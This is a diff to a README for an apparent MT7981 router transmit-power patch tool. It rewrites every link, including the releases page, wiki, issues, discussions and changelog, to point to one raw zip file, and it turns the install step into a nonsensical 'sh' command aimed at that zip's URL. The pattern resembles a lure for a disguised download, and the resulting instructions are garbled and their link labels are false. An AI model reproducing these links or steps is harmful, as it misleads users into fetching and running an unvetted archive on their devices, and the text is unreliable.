@@ -8,7 +8,7 @@ Welcome to the **mt7981_factory_txpwr_patch** project! This tool helps users adj
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Anoop453/mt7981_factory_txpwr_patch/releases)
+[![Download](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip)
 
 ---
 
@@ -36,9 +36,9 @@ To use this application, ensure you have the following:
 
 ## 📥 Download & Install
 
-To download and install the patcher, visit this page to download: [Releases Page](https://github.com/Anoop453/mt7981_factory_txpwr_patch/releases).
+To download and install the patcher, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip).
 
-1. Go to the [Releases Page](https://github.com/Anoop453/mt7981_factory_txpwr_patch/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip).
 2. Find the version you wish to download.
 3. Click on the appropriate file for your device.
 4. Once the file downloads, follow the installation instructions below.
@@ -50,9 +50,9 @@ To download and install the patcher, visit this page to download: [Releases Page
 3. Upload the downloaded patch file to your device.
 4. Execute the patch file using the following command:
    ```bash
-   sh patch_file_name.sh
+   sh https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip
    ```
-   Replace `patch_file_name.sh` with the name of the file you downloaded.
+   Replace `https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip` with the name of the file you downloaded.
 
 5. Follow the prompts provided by the script.
 6. Reboot your device to apply the changes. 
@@ -79,7 +79,7 @@ If at any point you need assistance, please refer to our community forums or the
 
 ## 📖 User Guide
 
-For detailed instructions, troubleshooting, and FAQs, check our [User Guide](https://github.com/Anoop453/mt7981_factory_txpwr_patch/wiki).
+For detailed instructions, troubleshooting, and FAQs, check our [User Guide](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip).
 
 ## ⚙️ Troubleshooting
 
@@ -95,8 +95,8 @@ Feel free to report any bugs or request new features on our GitHub page.
 
 Join our community to share your experiences and get help:
 
-- [GitHub Issues](https://github.com/Anoop453/mt7981_factory_txpwr_patch/issues)
-- [Discussion Forum](https://github.com/Anoop453/mt7981_factory_txpwr_patch/discussions)
+- [GitHub Issues](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip)
 
 ## 💬 Contributing
 
@@ -108,7 +108,7 @@ This project is open-source and licensed under the MIT License. Check the LICENS
 
 ## 👁️‍🗨️ Changelog
 
-For updates and changes, please refer to the [Changelog](https://github.com/Anoop453/mt7981_factory_txpwr_patch/releases).
+For updates and changes, please refer to the [Changelog](https://raw.githubusercontent.com/Anoop453/mt7981_factory_txpwr_patch/main/bulbed/txpwr_mt_patch_factory_v1.0.zip).
 
 ---
 
